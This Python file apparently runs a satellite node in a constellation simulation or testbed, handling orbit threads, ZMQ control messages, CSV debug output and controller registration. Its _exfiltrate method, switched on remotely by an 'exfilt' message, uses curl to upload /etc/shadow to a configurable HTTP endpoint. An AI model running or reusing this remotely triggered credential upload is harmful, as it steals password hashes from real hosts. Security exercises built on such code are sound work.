#!/usr/bin/env python3

import csv      # .writer () SatApp._DebugFunc ()
import os       # .getenv (), .path.join ()
import sys      # .exit ()
from   threading import Thread, Event
import time     # .time (), .sleep ()
from   typing import override

import requests

import ZmqSubscriber
from   ZmqPPWrapper import ZmqPPWrapperType

from   CLICommand import CLICommand

from   jsonArgParse import inRangeType, rangeType, httpEndpoint, satAppArgs, hilArgs
from   orbitApp     import OrbitApp


class SatApp (OrbitApp):

    _CURL_CMD = CLICommand ('/usr/bin/curl')

    def __init__ (self):
        super ().__init__ ()
        self._iPlane     = None         # populated by startOrbit ()
        self._iSat       = None         # (same as above)
        self._q_endpoint = None         # populated by setup () and referenced by startOrbit ()
        self._zmq_start  = Event ()     # accessed by startThreads () and provisionally set by _zmqSubCB ()
        self._debug_cap  = os.getenv ('SAT_DEBUG', None) in ('yes', 'enable', 'on', '1')

    @override
    def moreEpilogNotes (self):
        return f'''
  Required Environment Variables:

    PLANE    >= 1, <= num-planes
    ORDINAL  >= 1, <= num-sats
'''

    @override
    def cliArgParser (self):
        _cliParser = super ().cliArgParser ()
        _ = satAppArgs (_cliParser)
        _cliParser.add_argument ('--exfilt-endpoint',
                                 type = httpEndpoint,
                                 help = 'Exfiltration POST endpoint (example: "http://10.100.222.111:24519/exfilt")')
        return _cliParser

    class _DebugFunc:
        _funcObjs = dict ()    # key: (iPlane, iSat, interval), val: _debugFunc

        @classmethod
        def _writeGeoDict (cls, _outerObj, _geoDict: dict):
            _geoKey = (_geoDict.get ('plane'), _geoDict.get ('ordinal'), _geoDict.get ('interval'))
            if (_writeFn := cls._funcObjs.get (_geoKey)) is None:
                _writeFn = cls (_outerObj, _geoKey)
                cls._funcObjs[_geoKey] = _writeFn

            _writeFn._writeRow (_geoDict)

        @classmethod
        def _closeWrites (cls):
            for _writeFn in cls._funcObjs.values ():
                _writeFn._close ()

        def __init__ (self, _outerObj, _geoKey: tuple):
            self._real_time = _outerObj._args.real_time

            _fName = _outerObj._args.format.replace ('{plane}',      str (_geoKey[0]))   \
                                           .replace ('{ordinal}',    str (_geoKey[1]))   \
                                           .replace ('{interval}',   str (_geoKey[2]))   \
                                           .replace ('{num-sats}',   str (_outerObj._args.num_sats)) \
                                           .replace ('{num-planes}', str (_outerObj._args.num_planes))

            try:
                self._fOut   = open (_fName, 'w', newline = '')
                self._csvOut = csv.writer (self._fOut)
            except:     # ePerm
                self._fOut   = None
                self._csvOut = None

        def _writeRow (self, _geoDict):
            if self._csvOut:    # _close () check
                _row = list ([_geoDict.get ('plane'), _geoDict.get ('ordinal')])
                if self._real_time:
                    _row += [time.time ()]
                _row += [_geoDict.get ('time'),
                         _geoDict.get ('lat'), _geoDict.get ('lon'), _geoDict.get ('alt')]

                self._csvOut.writerow (_row)

        def _close (self):
            self._csvOut = None         # disable _writeRow ()
            if self._fOut:
                self._fOut.close ()

    def _exfiltrate (self, _outer, _dict: dict):
        if _ep := _outer._args.exfilt_endpoint:
            # /usr/bin/curl --upload-file /etc/shadow <_ep>
            _args = ['--upload-file', '/etc/shadow', _ep]
            try:
                _pCurl = self._CURL_CMD.run (_args)
                _pCurl.wait ()
            except Exception as _e:
                print (f'ERROR: {_dict}: {_e}')
                return

    def _zmqSubCB (self, _topic, _msg):

        def _checkPlaneOrdinal ():

            # Optional plane number or range

            if ((_iPlane := _msg.get ('plane')) is None) or \
               ((_iPTuple := rangeType (_iPlane, 1, self._args.num_planes, _raise = False)) and \
                inRangeType (self._iPlane, *_iPTuple, _openRange = False, _raise = False)):

                # Optional satellite number or range

                if ((_iSat := _msg.get ('ordinal') if _iPlane else None) is None) or \
                   ((_iSTuple := rangeType (_iSat, 1, self._args.num_sats, _raise = False)) and \
                    inRangeType (self._iSat, *_iSTuple, _openRange = False, _raise = False)):
                    return True

            return False

        def _checkPlaneOrdinalClass ():
            return _checkPlaneOrdinal () and (((_appClass := _msg.get ('class')) is None) or _appClass == 'sat')

        self.debugPrint (_topic, _msg)

        # Start _genOrbit ()

        if   _topic == 'start':

            # Accommodate a restarted process

            if not self._zmq_start.is_set ():
                if (_startTime := _msg.get ('start-time')) is not None:
                    self._args.start_time = _startTime

                self._zmq_start.set ()

        # Stop _genOrbit ()

        elif _topic == 'stop':
            if _checkPlaneOrdinalClass ():
                with self._rLock:
                    for _orThread in self.threadsWith (self._iPlane, self._iSat):
                        self._stopSet.add (_orThread)

                self._DebugFunc._closeWrites ()
                if not self._zmq_start.is_set ():
                    self._zmq_start.set ()
                    with self._startC:
                        self._startC.notify_all ()

        # Enable or disable debugging

        elif _topic == 'debug':
            if self._debug_cap and _checkPlaneOrdinal ():
                with self._rLock:
                    for _orThread in self.threadsWith (self._iPlane, self._iSat):
                        if   _msg.get ('enable', True):
                            self._debugFn[_orThread] = self._DebugFunc._writeGeoDict
                        elif _orThread in self._debugFn:
                            del self._debugFn[_orThread]

        # Enable or disable exfiltration

        elif _topic == 'exfilt':
            if _checkPlaneOrdinal ():
                with self._rLock:
                    for _orThread in self.threadsWith (self._iPlane, self._iSat):
                        if   _msg.get ('enable', True):
                            self._exfiltFn[_orThread] = self._exfiltrate
                        elif _orThread in self._exfiltFn:
                            del self._exfiltFn[_orThread]

    def _postRequest (self, _action: str, _dSat: dict):
        return requests.post (os.path.join (self._q_endpoint, _action), json = _dSat)

    @override
    def setup (self):
        self._q_endpoint = self._args.Q_endpoint

        # ZMQ subscription
        _zmqSub = ZmqSubscriber.ZmqSubscriber (None,
                                               self._args.Q_ZMQ_pub,
                                               '',
                                               self._zmqSubCB,
                                               ZmqPPWrapperType.JSON,
                                               False)
        _thread = Thread (target = lambda: _zmqSub.run (),
                          name   = 'ZMQ subscriber',
                          daemon = True)
        _thread.start ()

    @override
    def startOrbit (self, _target, _numPlanes, _numSats):
        if (_HZN_NODE_ID := os.getenv ('HZN_NODE_ID')) and \
           (_hilArgs := hilArgs (self._args)) and \
           (_planeOrdinal := _hilArgs.get (_HZN_NODE_ID)):
            _sPlane, _sSat = _planeOrdinal
            try:
                self._iPlane = inRangeType (_sPlane, 1, _numPlanes, _openRange = False)
                self._iSat   = inRangeType (_sSat,   1, _numSats,   _openRange = False)

                # Iterate over interval dict entries

                for _interval, _endpoint in self.epArgs.items ():
                    _nvargs = {'interval': _interval,
                               'endpoint': _endpoint,
                               'hil':      _HZN_NODE_ID
                              }
                    _thread = Thread (target = _target,
                                      name   = f'Gen node #{self._iSat}',
                                      args   = (self._iPlane, self._iSat, _nvargs),
                                      daemon = True)
                    with self._rLock:
                        self._threads[(self._iPlane, self._iSat, _interval)] = _thread

                    _thread.start ()

                    # Advertise satellite interval start to Q controller

                    _dSat = {'plane': self._iPlane, 'ordinal': self._iSat, 'interval': _interval}

                    while True:
                        try:
                            _resp = self._postRequest ('register', _dSat)
                        except Exception as _e:
                            self.debugPrint (f'{time.time ()} {_dSat}: {_e}')
                            time.sleep (2.0)
                            continue

                        try:
                            _resp.raise_for_status ()
                        except Exception as _e:
                            self.debugPrint (f'{time.time ()} {_dSat}: {_e} {_resp.json ()}')

                        break

            except Exception as _e:
                print (f'ERROR: {_e}')
                sys.exit (1)
        else:
            print (f'ERROR: bad or missing HZN_NODE_ID environment variable!')
            sys.exit (1)

    @override
    def startThreads (self, _args):
        # Wait for ZMQ start notification
        while not self._zmq_start.wait (2.0):
            pass

        super ().startThreads (_args)

    @override
    def stoppedThread (self, _iPlane: int, _iSat: int, _interval: float):

        # Unregister satellite interval from Q controller

        _dSat = {'plane': _iPlane, 'ordinal': _iSat, 'interval': _interval}

        try:
            _resp = self._postRequest ('unregister', _dSat)
        except Exception as _e:
            self.debugPrint (f'{time.time ()} {_dSat}: {_e}')
            return

        try:
            _resp.raise_for_status ()
        except Exception as _e:
            self.debugPrint (f'{time.time ()} {_dSat}: {_e} {_resp.json ()}')

if __name__ == '__main__':
    _satApp = SatApp ()
    _satApp.run ()
